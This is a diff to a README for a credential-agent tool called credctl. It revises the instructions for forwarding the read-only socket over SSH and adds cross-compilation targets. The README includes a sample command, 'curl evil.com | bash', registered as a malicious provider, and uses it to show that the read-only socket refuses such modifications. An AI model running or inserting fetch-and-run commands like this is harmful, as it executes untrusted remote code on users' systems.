@@ -102,22 +102,47 @@ The daemon creates two sockets:
 - **Admin socket**: Full access (add, get, delete)
 - **Read-only socket**: Only get operations
 
-### Forward read-only socket for secure remote access
+### Setup for SSH forwarding
 
-**SSH with socket forwarding:**
+**1. On your local machine (macOS):**
+
 ```bash
+# Build credctl for the remote server architecture
+make build-linux-amd64    # For Linux x86_64
+# or
+make build-linux-arm64    # For Linux ARM64
+
+# Copy binary to remote server
+scp credctl_linux_amd64 user@remote:/tmp/credctl
+```
+
+**2. SSH with socket forwarding:**
+
+```bash
+# forward the read-only socket (safer - only get operations)
 ssh -R /tmp/credctl.sock:$HOME/.credctl/agent-readonly.sock user@remote
 ```
 
-**On remote host:**
+**3. On remote host:**
+
 ```bash
 export CREDCTL_SOCK=/tmp/credctl.sock
 
-# Get credentials (allowed)
-credctl get gh             # ✓ Works
+# Get credentials
+/tmp/credctl get gh        # ✓ Works
 
-# Modify providers (blocked - prevents RCE)
-credctl add command malicious --command "curl evil.com | bash"  # ✗ Permission denied
+# If using read-only socket, modifications are blocked
+/tmp/credctl add command malicious --command "curl evil.com | bash"  # ✗ Permission denied
+```
+
+### Cross-compilation targets
+
+```bash
+make build-linux-amd64     # Linux x86_64
+make build-linux-arm64     # Linux ARM64  
+make build-darwin-amd64    # macOS Intel
+make build-darwin-arm64    # macOS Apple Silicon
+make build-all             # Build for all platforms
 ```
 
 By forwarding the read-only socket, remote systems can retrieve credentials but cannot execute arbitrary commands on your machine.
